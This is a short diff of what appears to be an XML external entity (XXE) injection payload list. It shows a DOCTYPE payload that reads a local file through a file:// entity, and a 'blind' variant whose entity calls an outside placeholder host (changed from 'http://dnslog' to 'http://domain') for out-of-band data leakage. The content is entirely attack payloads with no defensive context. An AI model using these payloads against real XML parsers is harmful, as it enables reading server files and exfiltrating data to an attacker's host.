@@ -4,4 +4,4 @@
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://filepath"> ]>
 
 # blind
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://dnslog"> ]>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://domain"> ]>
